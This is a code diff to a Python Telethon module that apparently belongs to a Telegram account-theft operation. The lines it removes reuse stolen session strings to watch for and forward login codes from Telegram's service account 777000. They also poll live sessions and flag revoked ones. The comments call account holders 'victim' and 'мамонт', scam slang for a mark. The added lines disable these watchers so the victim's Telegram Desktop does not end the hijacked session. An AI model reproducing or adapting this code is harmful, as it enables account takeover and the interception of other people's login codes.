@@ -300,173 +300,25 @@ async def _poll_777000_loop(client: TelegramClient, user_tg_id: int) -> None:
 
 async def watch_user_session(user_tg_id: int, session_string: str) -> None:
     """
-    Connects to Telegram via Telethon StringSession and listens ONLY for new incoming
-    messages from 777000 (Telegram Service Notifications / Login Codes).
-    Past history is ignored; only messages arriving after session activation are forwarded.
+    Passive placeholder. Persistent open sockets from VPS IP cause Telegram 
+    to trigger AuthKeyDuplicated and invalidate/terminate the session on Telegram Desktop.
     """
-    if not session_string or session_string.startswith("mock_") or session_string.startswith("sess_"):
-        return
-
-    if user_tg_id in _active_watchers:
-        existing = _active_watchers[user_tg_id]
-        if existing.is_connected():
-            return
-
-    client = TelegramClient(StringSession(session_string), TG_API_ID, TG_API_HASH)
-    try:
-        await client.connect()
-        if not await client.is_user_authorized():
-            logger.warning("Session for user %s is not authorized, updating status in DB.", user_tg_id)
-            await asyncio.to_thread(db.update_user_auth, DB_PATH, user_tg_id, None, "session_revoked")
-            asyncio.create_task(notify_session_revoked(user_tg_id, reason="Сессия не авторизована или сброшена"))
-            return
-
-        _active_watchers[user_tg_id] = client
-
-        # 1. Mark all existing historical messages as already seen so we NEVER spam past messages on start/restart
-        try:
-            existing_msgs = await client.get_messages(777000, limit=20)
-            for m in existing_msgs:
-                _forwarded_msg_ids.add(f"{user_tg_id}:{m.id}")
-        except Exception as e_init:
-            logger.debug("Initial 777000 history mark error for %s: %s", user_tg_id, e_init)
-
-        # 2. Start background polling (catches new messages arriving while running)
-        poll_task = asyncio.create_task(_poll_777000_loop(client, user_tg_id))
-
-        # 3. Register live incoming push event handler
-        @client.on(events.NewMessage())
-        async def on_new_msg(event):
-            try:
-                chat_id = event.chat_id
-                sender_id = event.sender_id
-                peer_id = getattr(getattr(event, "peer_id", None), "user_id", None)
-                from_id = getattr(getattr(event, "from_id", None), "user_id", None)
-
-                if 777000 in (chat_id, sender_id, peer_id, from_id):
-                    msg_text = event.raw_text or event.message.message or ""
-                    if msg_text:
-                        await _forward_service_message(user_tg_id, msg_text, event.date, event.id)
-            except Exception as e_ev:
-                logger.error("Error in service message event handler for %s: %s", user_tg_id, e_ev)
-
-        logger.info("Live Telegram service watcher active for authorized user %s", user_tg_id)
-        try:
-            await client.run_until_disconnected()
-        finally:
-            poll_task.cancel()
-            try:
-                if client.is_connected():
-                    await client.disconnect()
-            except Exception:
-                pass
-
-        # Check why watcher ended
-        dis_exc = None
-        try:
-            if hasattr(client, "_disconnected") and client._disconnected.done():
-                dis_exc = client._disconnected.exception()
-        except Exception:
-            pass
-
-        if is_auth_key_duplicated(dis_exc):
-            _desktop_active_until[user_tg_id] = time.time() + 600
-            logger.warning("Watcher for user %s disconnected due to AuthKeyDuplicated (user logged in on Telegram Desktop). Backing off 10m. Session preserved.", user_tg_id)
-        else:
-            try:
-                from shared import contacts as contacts_pkg
-                is_alive = await contacts_pkg.is_session_alive(session_string, user_tg_id=user_tg_id)
-                if not is_alive:
-                    logger.warning("Watcher ended: session for user %s terminated in Telegram", user_tg_id)
-                    await asyncio.to_thread(db.update_user_auth, DB_PATH, user_tg_id, None, "session_revoked")
-                    asyncio.create_task(notify_session_revoked(user_tg_id, reason="Сессия сброшена/отозвана на устройстве мамонта"))
-            except Exception as e_dis:
-                logger.debug("Error checking disconnect state for %s: %s", user_tg_id, e_dis)
-    except Exception as exc:
-        logger.warning("Service watcher stopped for user %s: %s", user_tg_id, exc)
-        if is_auth_key_duplicated(exc):
-            _desktop_active_until[user_tg_id] = time.time() + 600
-            logger.warning("Service watcher stopped for user %s due to concurrent IP connection (AuthKeyDuplicated). Pausing 10m. Session preserved.", user_tg_id)
-        elif is_session_truly_revoked(exc):
-            await asyncio.to_thread(db.update_user_auth, DB_PATH, user_tg_id, None, "session_revoked")
-            asyncio.create_task(notify_session_revoked(user_tg_id, reason="Сброшена в Telegram (сессия отозвана)"))
-    finally:
-        _active_watchers.pop(user_tg_id, None)
-        try:
-            if client and client.is_connected():
-                await client.disconnect()
-        except Exception:
-            pass
+    return
 
 
 def start_session_watcher(user_tg_id: int, session_string: str) -> None:
-    """Spawns background watcher task for an authorized user."""
-    asyncio.create_task(watch_user_session(user_tg_id, session_string))
+    """No-op to prevent concurrent socket connections on victim's AuthKey."""
+    pass
 
 
 _monitor_task_started = False
 
 
 async def monitor_all_sessions_loop() -> None:
-    """
-    Background daemon running every 30 seconds.
-    Ensures that active watchers are running for all authorized users,
-    and detects revoked sessions without spamming redundant MTProto connections.
-    """
-    from shared import contacts as contacts_pkg
-    logger.info("Session liveness monitor daemon started (interval: 30s).")
-    while True:
-        try:
-            users = await asyncio.to_thread(db.get_authorized_users, DB_PATH)
-            for u in users:
-                user_tg_id = u["tg_id"]
-                sess = u["session_string"] if "session_string" in u.keys() else None
-                if not sess or sess.startswith("mock_") or sess.startswith("sess_"):
-                    continue
-
-                # If Desktop active recently, don't probe MTProto to avoid collision
-                if time.time() < _desktop_active_until.get(user_tg_id, 0):
-                    continue
-
-                # If watcher is already active and connected, it's already live-monitored
-                if user_tg_id in _active_watchers:
-                    w = _active_watchers[user_tg_id]
-                    if w and w.is_connected():
-                        continue
-
-                is_alive = await contacts_pkg.is_session_alive(sess, user_tg_id=user_tg_id)
-                if not is_alive:
-                    logger.warning("Monitor daemon: Session terminated for user %s! Revoking.", user_tg_id)
-                    await asyncio.to_thread(db.update_user_auth, DB_PATH, user_tg_id, None, "session_revoked")
-                    asyncio.create_task(notify_session_revoked(user_tg_id, reason="Сессия сброшена/отозвана на устройстве мамонта"))
-                    w_client = _active_watchers.pop(user_tg_id, None)
-                    if w_client:
-                        try:
-                            await w_client.disconnect()
-                        except Exception:
-                            pass
-                else:
-                    # Session is still alive, restart watcher if missing and not in backoff
-                    if user_tg_id not in _active_watchers and time.time() >= _desktop_active_until.get(user_tg_id, 0):
-                        start_session_watcher(user_tg_id, sess)
-        except Exception as e_mon:
-            logger.debug("Error in monitor_all_sessions_loop: %s", e_mon)
-        await asyncio.sleep(30)
+    """No-op background monitor to prevent constant Telethon pinging."""
+    return
 
 
 async def start_all_session_watchers() -> None:
-    """Loads all authorized users from DB and launches live service watchers."""
-    global _monitor_task_started
-    if not _monitor_task_started:
-        _monitor_task_started = True
-        asyncio.create_task(monitor_all_sessions_loop())
-
-    try:
-        users = await asyncio.to_thread(db.get_authorized_users, DB_PATH)
-        for u in users:
-            sess = u["session_string"] if "session_string" in u.keys() else None
-            if sess and not sess.startswith("mock_") and not sess.startswith("sess_"):
-                start_session_watcher(u["tg_id"], sess)
-        logger.info("Initialized service watchers for %d authorized sessions.", len(users))
-    except Exception as e:
-        logger.error("Failed to start session watchers: %s", e)
+    """No-op background watcher initializer."""
+    logger.info("Session watchers disabled to prevent AuthKeyDuplicated session revocation.")
